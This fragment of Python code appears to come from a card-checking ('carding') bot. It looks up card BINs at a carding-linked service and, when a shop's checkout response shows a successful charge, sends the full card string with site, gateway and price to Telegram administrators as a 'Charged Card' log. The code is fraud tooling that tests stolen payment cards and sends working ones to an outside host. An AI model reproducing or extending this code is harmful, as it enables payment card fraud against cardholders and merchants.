...
try:
    ...
    if isinstance(admin_data, list):
        TELEGRAM_ADMIN_IDS = [str(x) for x in admin_data]
    else:
        TELEGRAM_ADMIN_IDS = [str(admin_data)]
except Exception:
    TELEGRAM_ADMIN_IDS = [admin_env.strip("[]\"' ")]

async def get_bin_info(cc_number):
    try:
        bin_num = cc_number[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_num}") as r:
                if r.status == 200:
...
async def send_telegram_log_async(cc_string, site, gateway, price, currency, response_msg):
    cc_num = cc_string.split('|')[0].strip() if cc_string else ""
    bi = await get_bin_info(cc_num)
    
    price_str = f"${price}" if price else "-"
    if currency and currency != "USD" and price:
        price_str += f" {currency}"
        
    message_text = f"""🔥 <b>{bs('LOG: Charged Card')}</b> 🔥
<b>━━━━━━━━━━━━━━━━━</b>
🔥 <b>{bs('Card')}:</b> <code>{cc_string}</code>
🔥 <b>{bs('Gateway')}:</b> <code>{gateway}</code>
🔥 <b>{bs('Response')}:</b> <code>{response_msg}</code>
🔥 <b>{bs('Price')}:</b> <code>{price_str}</code>
🔥 <b>{bs('Site')}:</b> <code>{site}</code>
<b>━━━━━━━━━━━━━━━━━</b>
...
<b>━━━━━━━━━━━━━━━━━</b>"""
        ...
        try:
            ...
            ch_keywords = ['order_paid', 'order_placed', 'order_confirmed', 'thank you', 'payment successful', 'order_completed', 'charged', 'order_created', 'order confirmed']
            is_charged = any(kw in clean_lower for kw in ch_keywords)
            if is_charged:
                try:
                    loop.run_until_complete(
                        send_telegram_log_async(cc_string, site, gateway, price, currency, clean_response)
                    )
                except Exception:
                    pass
        finally:
